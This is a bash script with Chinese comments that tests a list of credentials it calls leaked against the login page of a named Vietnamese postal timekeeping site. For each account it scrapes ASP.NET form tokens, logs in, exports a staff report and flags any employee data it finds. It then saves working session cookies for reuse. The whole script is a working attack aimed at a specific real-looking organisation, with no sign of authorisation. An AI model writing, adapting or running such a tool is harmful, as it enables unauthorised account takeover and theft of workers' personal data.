#!/bin/bash

BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥🔥🔥 Phase 1: 测试所有泄露的Chamcong账号"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 所有泄露的账号
ACCOUNTS=(
    "KVMBTCVP:123"
    "KVMBTCKT:123"
    "KVMTBDVP:123"
    "KVMTNVKS:123"
    "KVMTVCGN:234"
)

for account in "${ACCOUNTS[@]}"; do
    user=$(echo $account | cut -d':' -f1)
    pass=$(echo $account | cut -d':' -f2)
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "🔑 测试账号: $user / $pass"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    # 获取登录页面ViewState
    login_page=$(curl -sk "${BASE}/login.aspx" -c "cookie_${user}.txt")
    VIEWSTATE=$(echo "$login_page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VIEWGEN=$(echo "$login_page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EVENTVAL=$(echo "$login_page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    # 登录
    echo "[*] 尝试登录..."
    curl -sk "${BASE}/login.aspx" \
        -X POST \
        -b "cookie_${user}.txt" \
        -c "cookie_${user}.txt" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Referer: ${BASE}/login.aspx" \
        --data-urlencode "__EVENTTARGET=" \
        --data-urlencode "__EVENTARGUMENT=" \
        --data-urlencode "__VIEWSTATE=$VIEWSTATE" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VIEWGEN" \
        --data-urlencode "__EVENTVALIDATION=$EVENTVAL" \
        --data-urlencode "tUser=$user" \
        --data-urlencode "tPass=$pass" \
        --data-urlencode "tOk=Đăng nhập" \
        -L \
        -o "login_result_${user}.html" 2>&1
    
    # 检查登录结果
    if grep -qi "login\|đăng nhập" "login_result_${user}.html"; then
        echo "  ❌ 登录失败"
        continue
    else
        echo "  ✅ 登录成功!"
    fi
    
    # 获取Session ID
    SESSION_ID=$(grep "ASP.NET_SessionId" "cookie_${user}.txt" | awk '{print $7}')
    echo "  Session: $SESSION_ID"
    
    # 测试leftmenu（检查菜单权限）
    echo "[*] 获取菜单..."
    curl -sk "${BASE}/leftmenu.aspx" \
        -b "cookie_${user}.txt" \
        -o "leftmenu_${user}.html" 2>&1
    
    menu_size=$(wc -c < "leftmenu_${user}.html")
    echo "  菜单大小: $menu_size bytes"
    
    # 提取菜单项
    menu_count=$(strings "leftmenu_${user}.html" | grep -c "\.aspx" || echo 0)
    echo "  菜单项数量: $menu_count"
    
    # 测试MAU2报表
    echo "[*] 测试MAU2报表..."
    
    # 获取ViewState
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -b "cookie_${user}.txt")
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
    
    # 导出报表
    curl -sk "${BASE}/report/inBCC.aspx?ID=MAU2" \
        -X POST \
        -b "cookie_${user}.txt" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "report_MAU2_${user}.html" 2>&1
    
    report_size=$(wc -c < "report_MAU2_${user}.html")
    echo "  报表大小: $report_size bytes"
    
    # 检查是否有实际数据
    if [ $report_size -gt 6000 ]; then
        echo "  🔥🔥🔥 可能有更多数据!"
        # 检查是否包含员工信息
        if strings "report_MAU2_${user}.html" | grep -qE "[A-Z]{4,}[0-9]|Họ tên"; then
            echo "  🔥🔥🔥 发现员工数据!!!"
            strings "report_MAU2_${user}.html" | head -50
        fi
    elif [ $report_size -lt 100 ]; then
        echo "  ⚠️  无权限访问报表"
    else
        echo "  - 报表为空"
    fi
    
    # 保存成功的Session
    if [ $report_size -gt 3000 ]; then
        echo "  ✅ 保存为有效Session"
        cp "cookie_${user}.txt" "valid_session_${user}.txt"
        echo "Cookie: ASP.NET_SessionId=$SESSION_ID" > "session_${user}.txt"
    fi
    
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 所有账号测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "🔥 成功登录的账号:"
ls -lh valid_session_*.txt 2>/dev/null || echo "  无"
echo ""
echo "📄 登录结果文件:"
ls -lh login_result_*.html 2>/dev/null | head -10
echo ""
echo "📋 报表文件:"
ls -lh report_MAU2_*.html 2>/dev/null | head -10
